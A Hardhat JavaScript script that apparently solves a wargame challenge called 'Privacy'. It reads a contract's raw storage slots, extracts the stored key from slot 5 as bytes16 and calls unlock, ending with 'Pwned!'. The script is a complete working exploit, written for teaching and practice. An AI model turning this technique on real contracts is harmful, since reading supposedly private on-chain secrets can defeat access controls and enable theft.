const { getNamedAccounts, ethers } = require("hardhat")

const privacyInstanceAddress = "0xF970e938424868491B96d83D8f2ADe8fE72C0803"

async function main() {
  const { deployer } = await getNamedAccounts()
  const privacy = await ethers.getContractAt("Privacy", privacyInstanceAddress, deployer)
  console.log("Connected to your instance of Privacy contract!")

  console.log("Deploying attacker contract...")
  await deployments.fixture("privacy")
  const attacker = await ethers.getContract("PrivacyAttacker", deployer)

  let storage = []
  for (let i = 0; i < 6; i++) {
    storage[i] = await ethers.provider.getStorageAt(privacy.address, i)
    console.log(`[State variables] Storage at position ${i}: ${storage[i]}`)
  }

  // uint16 and uint8 get all stored in slot 2
  // bytes32 is 256 bits size so it occupies an entire string
  console.log("Converting storage at position 5 to bytes16...")
  const bytes16Password = await attacker.convert(storage[5])

  console.log("Using converted data to unlock...")
  const unlocking = await privacy.unlock(bytes16Password)
  await unlocking.wait(1)

  console.log("Pwned!")
}

// Call th main function and log errors if any occur
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
